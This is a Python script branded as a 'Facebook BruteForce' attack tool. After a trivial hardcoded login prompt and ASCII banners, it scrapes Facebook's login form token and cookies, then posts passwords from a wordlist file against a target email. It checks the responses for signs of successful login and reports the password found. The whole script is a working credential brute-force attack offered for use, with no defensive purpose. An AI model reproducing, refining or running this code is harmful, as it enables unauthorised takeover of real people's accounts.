import os.path
import requests
from bs4 import BeautifulSoup
import sys
color_off="\033[0m"       # Text Reset
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

logo=(red+"""

 __          ___    _ _____ _______ ______ 
 \ \        / / |  | |_   _|__   __|  ____|
  \ \  /\  / /| |__| | | |    | |  | |__   
   \ \/  \/ / |  __  | | |    | |  |  __|  
    \  /\  /  | |  | |_| |_   | |  | |____ 
     \/  \/   |_|  |_|_____|  |_|  |______|
                                           
                                           
""")
logo2=(green+"""

______ _____    _____ _     
|  _  \  ___|  |_   _| |    
| | | | |____   _| | | |    
| | | |  __\ \ / / | | |    
| |/ /| |___\ V /| |_| |____
|___/ \____/ \_/\___/\_____/
                            
                            
""")
print(logo+logo2)
print(purple+"                     LOGIN PANAL ©©©©©")

usern="w"
passwd="w"


inpuser=str(input("         Enter Your username>>> "))
inppass=str(input("         Enter Your password >>> "))

if usern==inpuser and passwd== inppass:
	print("{√} username & password correct!")
	pass
else:
	print("{x}username & password wrong!!")
	sys.exit()
	
logo=(red+"""

 __          ___    _ _____ _______ ______ 
 \ \        / / |  | |_   _|__   __|  ____|
  \ \  /\  / /| |__| | | |    | |  | |__   
   \ \/  \/ / |  __  | | |    | |  |  __|  
    \  /\  /  | |  | |_| |_   | |  | |____ 
     \/  \/   |_|  |_|_____|  |_|  |______|
                                           
                                           
""")
logo2=(green+"""

______ _____    _____ _     
|  _  \  ___|  |_   _| |    
| | | | |____   _| | | |    
| | | |  __\ \ / / | | |    
| |/ /| |___\ V /| |_| |____
|___/ \____/ \_/\___/\_____/
                            
                            
""")

print(logo+logo2)


print(green+"     ®®®®   THIS IS FACEBOOK BF  ATTACK TOOL. ®®®®")



PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False


if __name__ == "__main__":
    print('\n---------- Welcome To Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input(cyan+'\n\nEnter Email/Username to target: ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
           
        print(blue+"\n\nTrying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
